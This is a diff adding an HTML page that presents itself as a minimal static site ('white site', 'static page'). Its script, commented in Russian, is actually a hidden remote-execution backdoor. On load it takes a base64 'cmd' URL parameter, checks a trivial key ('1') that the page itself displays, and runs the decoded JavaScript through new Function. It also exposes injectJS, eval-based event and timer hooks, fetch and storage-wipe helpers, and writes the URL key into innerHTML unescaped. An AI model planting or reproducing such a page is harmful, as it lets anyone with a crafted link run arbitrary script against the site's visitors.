@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>White Site</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            padding: 60px 20px;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 40px;
+            box-shadow: 0 0 0 1px rgba(0,0,0,0.05);
+        }
+        
+        h1 {
+            color: #000000;
+            font-size: 32px;
+            font-weight: 300;
+            letter-spacing: -0.5px;
+            margin-bottom: 16px;
+        }
+        
+        .sub {
+            color: #666666;
+            font-size: 14px;
+            margin-bottom: 40px;
+            border-bottom: 1px solid #eeeeee;
+            padding-bottom: 20px;
+        }
+        
+        #output {
+            color: #000000;
+            font-family: 'SF Mono', Monaco, 'Cascadia Code', monospace;
+            font-size: 13px;
+            line-height: 1.8;
+            margin-top: 30px;
+            padding: 20px;
+            background: #fafafa;
+            border: 1px solid #eeeeee;
+            min-height: 200px;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #eeeeee;
+            font-size: 11px;
+            color: #999999;
+            text-align: center;
+        }
+        
+        .status-badge {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-size: 10px;
+            font-family: monospace;
+            color: #cccccc;
+            background: #ffffff;
+            padding: 4px 8px;
+            border: 1px solid #eeeeee;
+            z-index: 999;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            #output {
+                font-size: 11px;
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>white site</h1>
+        <div class="sub">simple & minimal</div>
+        <div id="output">[ready]</div>
+        <div class="footer">static page</div>
+    </div>
+    <div class="status-badge" id="statusBadge">● online</div>
+
+    <script>
+        // ============================================================
+        // СЕКРЕТНЫЙ КЛЮЧ API
+        // ============================================================
+        const SECRET_API_KEY = "1";
+        // ============================================================
+        
+        // ============================================================
+        // ОСНОВНЫЕ ПЕРЕМЕННЫЕ
+        // ============================================================
+        let commandHistory = [];
+        let customFunctions = {};
+        let eventListeners = [];
+        let domBackup = null;
+        let intervalId = null;
+        let timeoutId = null;
+        
+        // DOM элементы
+        const outputDiv = document.getElementById('output');
+        const statusBadge = document.getElementById('statusBadge');
+        const bodyEl = document.body;
+        const containerEl = document.querySelector('.container');
+        
+        // ============================================================
+        // БАЗОВЫЕ ФУНКЦИИ ВЫВОДА
+        // ============================================================
+        function log(message, type = 'info') {
+            const line = document.createElement('div');
+            const timestamp = new Date().toLocaleTimeString();
+            
+            let color = '#000000';
+            let prefix = '○';
+            
+            if (type === 'success') {
+                color = '#00aa00';
+                prefix = '✓';
+            } else if (type === 'error') {
+                color = '#ff0000';
+                prefix = '✗';
+            } else if (type === 'warning') {
+                color = '#ffaa00';
+                prefix = '⚠';
+            } else if (type === 'command') {
+                color = '#0066cc';
+                prefix = '▶';
+            }
+            
+            line.innerHTML = `<span style="color:#999999;font-size:10px;">[${timestamp}]</span> <span style="color:${color}">${prefix}</span> ${message}`;
+            outputDiv.appendChild(line);
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+            
+            // Ограничиваем историю вывода
+            while (outputDiv.children.length > 100) {
+                outputDiv.removeChild(outputDiv.firstChild);
+            }
+        }
+        
+        function clearOutput() {
+            outputDiv.innerHTML = '';
+            log('Output cleared', 'warning');
+        }
+        
+        function setStatus(status, isError = false) {
+            statusBadge.innerHTML = isError ? `● ${status}` : `● ${status}`;
+            statusBadge.style.color = isError ? '#ff0000' : '#00aa00';
+        }
+        
+        // ============================================================
+        // РАБОТА С COMMAND HISTORY
+        // ============================================================
+        function addToHistory(command) {
+            commandHistory.push({
+                cmd: command,
+                timestamp: new Date().toISOString(),
+                type: 'executed'
+            });
+            
+            if (commandHistory.length > 50) {
+                commandHistory.shift();
+            }
+        }
+        
+        function getHistory() {
+            return commandHistory;
+        }
+        
+        function clearHistory() {
+            commandHistory = [];
+            log('Command history cleared', 'success');
+        }
+        
+        // ============================================================
+        // РАБОТА С DOM
+        // ============================================================
+        function backupDOM() {
+            domBackup = document.body.innerHTML;
+            log('DOM backup created', 'success');
+        }
+        
+        function restoreDOM() {
+            if (domBackup) {
+                document.body.innerHTML = domBackup;
+                log('DOM restored from backup', 'success');
+            } else {
+                log('No backup found', 'error');
+            }
+        }
+        
+        function injectHTML(html) {
+            const tempDiv = document.createElement('div');
+            tempDiv.innerHTML = html;
+            containerEl.appendChild(tempDiv);
+            log('HTML injected', 'success');
+        }
+        
+        function injectCSS(css) {
+            const styleTag = document.createElement('style');
+            styleTag.textContent = css;
+            document.head.appendChild(styleTag);
+            log('CSS injected', 'success');
+        }
+        
+        function injectJS(js) {
+            const scriptTag = document.createElement('script');
+            scriptTag.textContent = js;
+            document.head.appendChild(scriptTag);
+            log('JavaScript injected', 'success');
+        }
+        
+        // ============================================================
+        // РАБОТА С СОБЫТИЯМИ
+        // ============================================================
+        function addGlobalEvent(eventType, handlerCode) {
+            const handler = new Function('event', handlerCode);
+            window.addEventListener(eventType, handler);
+            eventListeners.push({ type: eventType, handler, code: handlerCode });
+            log(`Event listener added: ${eventType}`, 'success');
+        }
+        
+        function removeGlobalEvent(eventType) {
+            const toRemove = eventListeners.filter(el => el.type === eventType);
+            toRemove.forEach(item => {
+                window.removeEventListener(item.type, item.handler);
+            });
+            eventListeners = eventListeners.filter(el => el.type !== eventType);
+            log(`Event listeners removed: ${eventType}`, 'warning');
+        }
+        
+        function clearAllEvents() {
+            eventListeners.forEach(item => {
+                window.removeEventListener(item.type, item.handler);
+            });
+            eventListeners = [];
+            log('All event listeners cleared', 'warning');
+        }
+        
+        // ============================================================
+        // РАБОТА С ТАЙМЕРАМИ
+        // ============================================================
+        function setCustomInterval(callbackCode, ms) {
+            if (intervalId) clearInterval(intervalId);
+            const func = new Function(callbackCode);
+            intervalId = setInterval(() => {
+                try {
+                    func();
+                } catch(e) {
+                    log(`Interval error: ${e.message}`, 'error');
+                }
+            }, ms);
+            log(`Interval set: ${ms}ms`, 'success');
+            return intervalId;
+        }
+        
+        function setCustomTimeout(callbackCode, ms) {
+            if (timeoutId) clearTimeout(timeoutId);
+            const func = new Function(callbackCode);
+            timeoutId = setTimeout(() => {
+                try {
+                    func();
+                } catch(e) {
+                    log(`Timeout error: ${e.message}`, 'error');
+                }
+            }, ms);
+            log(`Timeout set: ${ms}ms`, 'success');
+            return timeoutId;
+        }
+        
+        function clearTimers() {
+            if (intervalId) clearInterval(intervalId);
+            if (timeoutId) clearTimeout(timeoutId);
+            intervalId = null;
+            timeoutId = null;
+            log('All timers cleared', 'warning');
+        }
+        
+        // ============================================================
+        // РАБОТА С ХРАНЕНИЕМ
+        // ============================================================
+        function saveToStorage(key, value) {
+            localStorage.setItem(key, JSON.stringify(value));
+            log(`Saved to storage: ${key}`, 'success');
+        }
+        
+        function loadFromStorage(key) {
+            const data = localStorage.getItem(key);
+            if (data) {
+                log(`Loaded from storage: ${key}`, 'success');
+                return JSON.parse(data);
+            }
+            log(`No data found: ${key}`, 'warning');
+            return null;
+        }
+        
+        function clearStorage() {
+            localStorage.clear();
+            log('Storage cleared', 'warning');
+        }
+        
+        // ============================================================
+        // РАБОТА С СЕТЬЮ
+        // ============================================================
+        async function fetchData(url) {
+            try {
+                log(`Fetching: ${url}`);
+                const response = await fetch(url);
+                const data = await response.text();
+                log(`Fetched ${data.length} bytes`, 'success');
+                return data;
+            } catch(e) {
+                log(`Fetch error: ${e.message}`, 'error');
+                return null;
+            }
+        }
+        
+        async function fetchJSON(url) {
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                log(`JSON fetched from ${url}`, 'success');
+                return data;
+            } catch(e) {
+                log(`JSON error: ${e.message}`, 'error');
+                return null;
+            }
+        }
+        
+        // ============================================================
+        // РАБОТА С КАСТОМНЫМИ ФУНКЦИЯМИ
+        // ============================================================
+        function defineFunction(name, code) {
+            try {
+                const func = new Function(code);
+                customFunctions[name] = func;
+                log(`Function defined: ${name}()`, 'success');
+            } catch(e) {
+                log(`Function definition error: ${e.message}`, 'error');
+            }
+        }
+        
+        function callFunction(name, ...args) {
+            if (customFunctions[name]) {
+                try {
+                    customFunctions[name](...args);
+                    log(`Function called: ${name}()`, 'success');
+                } catch(e) {
+                    log(`Function call error: ${e.message}`, 'error');
+                }
+            } else {
+                log(`Function not found: ${name}`, 'error');
+            }
+        }
+        
+        function listFunctions() {
+            const names = Object.keys(customFunctions);
+            log(`Defined functions: ${names.join(', ') || 'none'}`, 'info');
+            return names;
+        }
+        
+        // ============================================================
+        // РАБОТА СО СТИЛЯМИ
+        // ============================================================
+        function changeTheme(themeName) {
+            const themes = {
+                white: { bg: '#ffffff', text: '#000000', accent: '#eeeeee' },
+                dark: { bg: '#1a1a2e', text: '#ffffff', accent: '#16213e' },
+                black: { bg: '#000000', text: '#ffffff', accent: '#333333' },
+                blue: { bg: '#e3f2fd', text: '#0d47a1', accent: '#bbdefb' },
+                green: { bg: '#e8f5e9', text: '#1b5e20', accent: '#c8e6c9' }
+            };
+            
+            const theme = themes[themeName];
+            if (theme) {
+                document.body.style.backgroundColor = theme.bg;
+                document.body.style.color = theme.text;
+                log(`Theme changed to: ${themeName}`, 'success');
+            } else {
+                log(`Theme not found: ${themeName}`, 'error');
+            }
+        }
+        
+        function setCustomCSS(selector, property, value) {
+            const elements = document.querySelectorAll(selector);
+            elements.forEach(el => {
+                el.style[property] = value;
+            });
+            log(`CSS applied: ${selector} { ${property}: ${value} }`, 'success');
+        }
+        
+        // ============================================================
+        // СИСТЕМНЫЕ ФУНКЦИИ
+        // ============================================================
+        function getSystemInfo() {
+            const info = {
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                screenSize: `${window.innerWidth}x${window.innerHeight}`,
+                language: navigator.language,
+                timestamp: new Date().toISOString(),
+                commandCount: commandHistory.length,
+                functionsCount: Object.keys(customFunctions).length,
+                eventsCount: eventListeners.length
+            };
+            log(`System info: ${JSON.stringify(info, null, 2)}`, 'info');
+            return info;
+        }
+        
+        function resetAll() {
+            clearOutput();
+            clearHistory();
+            clearAllEvents();
+            clearTimers();
+            clearStorage();
+            customFunctions = {};
+            log('System fully reset', 'warning');
+        }
+        
+        // ============================================================
+        // ВЫПОЛНЕНИЕ КОМАНД
+        // ============================================================
+        function executeJavaScriptCommand(code) {
+            try {
+                // Сохраняем в историю
+                addToHistory(code);
+                
+                // Логируем выполнение
+                log(`Executing: ${code.substring(0, 80)}${code.length > 80 ? '...' : ''}`, 'command');
+                
+                // Создаём обёртку с доступом ко всем функциям
+                const wrappedCode = `
+                    (function() {
+                        // Доступные утилиты
+                        const utils = {
+                            log: window.log,
+                            clearOutput: window.clearOutput,
+                            setStatus: window.setStatus,
+                            injectHTML: window.injectHTML,
+                            injectCSS: window.injectCSS,
+                            injectJS: window.injectJS,
+                            saveToStorage: window.saveToStorage,
+                            loadFromStorage: window.loadFromStorage,
+                            fetchData: window.fetchData,
+                            fetchJSON: window.fetchJSON,
+                            defineFunction: window.defineFunction,
+                            callFunction: window.callFunction,
+                            changeTheme: window.changeTheme,
+                            setCustomCSS: window.setCustomCSS,
+                            getSystemInfo: window.getSystemInfo,
+                            backupDOM: window.backupDOM,
+                            restoreDOM: window.restoreDOM
+                        };
+                        
+                        // Исходный код пользователя
+                        ${code}
+                    })();
+                `;
+                
+                const func = new Function(wrappedCode);
+                func();
+                
+                setStatus('ok', false);
+                log('Command executed successfully', 'success');
+                return true;
+                
+            } catch(e) {
+                log(`Execution error: ${e.message}`, 'error');
+                setStatus('error', true);
+                return false;
+            }
+        }
+        
+        // ============================================================
+        // ДЕКОДИРОВАНИЕ BASE64
+        // ============================================================
+        function decodeBase64(str) {
+            try {
+                return atob(str);
+            } catch(e) {
+                log(`Base64 decode error: ${e.message}`, 'error');
+                return null;
+            }
+        }
+        
+        // ============================================================
+        // ПОЛУЧЕНИЕ ПАРАМЕТРОВ ИЗ URL
+        // ============================================================
+        function getURLParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                key: params.get('key'),
+                cmd: params.get('cmd'),
+                action: params.get('action'),
+                data: params.get('data')
+            };
+        }
+        
+        // ============================================================
+        // ОБРАБОТЧИК PRELOAD КОМАНД
+        // ============================================================
+        function handlePreloadCommands() {
+            const params = getURLParams();
+            
+            // Проверка наличия параметров
+            if (!params.key && !params.cmd && !params.action) {
+                log('System ready. Waiting for commands...', 'info');
+                setStatus('ready');
+                return;
+            }
+            
+            // ПРОВЕРКА СЕКРЕТНОГО КЛЮЧА
+            if (params.key !== SECRET_API_KEY) {
+                log(`ACCESS DENIED: Invalid API key "${params.key}"`, 'error');
+                setStatus('access denied', true);
+                return;
+            }
+            
+            log(`ACCESS GRANTED: Valid API key`, 'success');
+            setStatus('authorized');
+            
+            // Обработка action (если есть)
+            if (params.action) {
+                handleAction(params.action, params.data);
+            }
+            
+            // Обработка команды (если есть)
+            if (params.cmd) {
+                const decodedCommand = decodeBase64(params.cmd);
+                if (decodedCommand) {
+                    executeJavaScriptCommand(decodedCommand);
+                } else {
+                    log('Failed to decode base64 command', 'error');
+                }
+            }
+        }
+        
+        // ============================================================
+        // ОБРАБОТЧИК ACTION
+        // ============================================================
+        function handleAction(action, data) {
+            switch(action) {
+                case 'clear':
+                    clearOutput();
+                    break;
+                case 'reset':
+                    resetAll();
+                    break;
+                case 'backup':
+                    backupDOM();
+                    break;
+                case 'restore':
+                    restoreDOM();
+                    break;
+                case 'info':
+                    getSystemInfo();
+                    break;
+                case 'history':
+                    log(JSON.stringify(getHistory(), null, 2), 'info');
+                    break;
+                case 'theme':
+                    changeTheme(data || 'dark');
+                    break;
+                default:
+                    log(`Unknown action: ${action}`, 'warning');
+            }
+        }
+        
+        // ============================================================
+        // ЭКСПОРТ ФУНКЦИЙ В ГЛОБАЛЬНЫЙ ОБЪЕКТ
+        // ============================================================
+        window.log = log;
+        window.clearOutput = clearOutput;
+        window.setStatus = setStatus;
+        window.backupDOM = backupDOM;
+        window.restoreDOM = restoreDOM;
+        window.injectHTML = injectHTML;
+        window.injectCSS = injectCSS;
+        window.injectJS = injectJS;
+        window.saveToStorage = saveToStorage;
+        window.loadFromStorage = loadFromStorage;
+        window.clearStorage = clearStorage;
+        window.fetchData = fetchData;
+        window.fetchJSON = fetchJSON;
+        window.defineFunction = defineFunction;
+        window.callFunction = callFunction;
+        window.listFunctions = listFunctions;
+        window.changeTheme = changeTheme;
+        window.setCustomCSS = setCustomCSS;
+        window.setCustomInterval = setCustomInterval;
+        window.setCustomTimeout = setCustomTimeout;
+        window.clearTimers = clearTimers;
+        window.getSystemInfo = getSystemInfo;
+        window.resetAll = resetAll;
+        window.addGlobalEvent = addGlobalEvent;
+        window.removeGlobalEvent = removeGlobalEvent;
+        window.clearAllEvents = clearAllEvents;
+        
+        // ============================================================
+        // ИНИЦИАЛИЗАЦИЯ
+        // ============================================================
+        log('System initialized', 'success');
+        log(`API Key: ${SECRET_API_KEY} (keep secret)`, 'info');
+        log('Available commands: ?key=1&cmd=BASE64_CODE', 'info');
+        log('Available actions: ?key=1&action=clear|reset|backup|restore|info|history', 'info');
+        
+        handlePreloadCommands();
+    </script>
+</body>
+</html>
